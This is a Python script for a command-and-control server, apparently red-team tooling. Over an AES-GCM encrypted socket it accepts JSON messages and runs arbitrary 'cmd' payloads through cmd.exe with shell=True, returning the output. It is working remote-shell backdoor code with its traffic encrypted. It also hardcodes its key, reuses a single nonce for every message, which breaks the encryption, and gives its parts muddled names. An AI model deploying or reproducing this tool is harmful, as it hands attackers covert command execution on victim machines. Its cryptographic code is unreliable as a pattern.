import socket, threading, json, os, subprocess, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib


HOST = '127.0.0.1'
PORT = 9999


# ✅ FIXED: Ensure key is exactly 32 bytes (256 bits) for AES-256-GCM
AES_KEY = hashlib.sha256(b"RedTeamSecretKey12345!").digest()  
print(f"[+] Key Length: {len(AES_KEY)} bytes")


class C2Server:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((HOST, PORT))
        self.server_socket.listen(5)
        print(f"[+] Controller Listening on {HOST}:{PORT}")


    def handle_client(self, client_socket, addr):
        try:
            nonce_bytes = os.urandom(12)  # ✅ Use bytes directly
            nonce_hex = nonce_bytes.hex()  # ✅ Convert to hex for JSON transmission
            header_data = json.dumps({'id': 'controller', 'nonce': nonce_hex})
            client_socket.sendall(header_data.encode())


            print(f"[+] Client Connected from {addr}")


            while True:
                try:
                    encrypted_msg = client_socket.recv(4096)
                    if not encrypted_msg: break
                    
                    # ✅ FIXED: Convert hex string back to bytes before decrypting
                    nonce_bytes_decoded = bytes.fromhex(nonce_hex)
                    aesgcm_instance = AESGCM(AES_KEY)  # ✅ Create instance per message
                    decrypted_msg = aesgcm_instance.decrypt(nonce_bytes_decoded, encrypted_msg, None)
                    cmd_data = json.loads(decrypted_msg.decode())


                    msg_type = cmd_data.get('type')
                    payload = cmd_data.get('payload', '')


                    response = {}
                    
                    if msg_type == 'cmd':
                        try:
                            result = subprocess.check_output(
                                f'cmd.exe /c {payload}', shell=True, stderr=subprocess.STDOUT, timeout=10)
                            response['type'] = 'resp'
                            response['status'] = 'success'
                            response['output'] = result.decode()
                        except Exception as e:
                            response['type'] = 'resp'
                            response['status'] = 'error'
                            response['output'] = str(e)


                    elif msg_type == 'ping':
                        response['type'] = 'resp'
                        response['payload'] = 'alive'


                    # ✅ FIXED: Convert hex string back to bytes before encrypting
                    nonce_bytes_encrypted = bytes.fromhex(nonce_hex)
                    encrypted_resp = aesgcm_instance.encrypt(nonce_bytes_encrypted, json.dumps(response).encode(), None)
                    client_socket.sendall(encrypted_resp)


                except Exception as e:
                    print(f"[!] Command Error from {addr}: {e}")
                    break


        except Exception as e:
            print(f"[!] Connection error from {addr}: {e}")


if __name__ == "__main__":
    try:
        server = C2Server()
        while True:
            client_socket, addr = server.server_socket.accept()
            thread = threading.Thread(target=server.handle_client, args=(client_socket, addr))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[+] Controller Shutting Down...")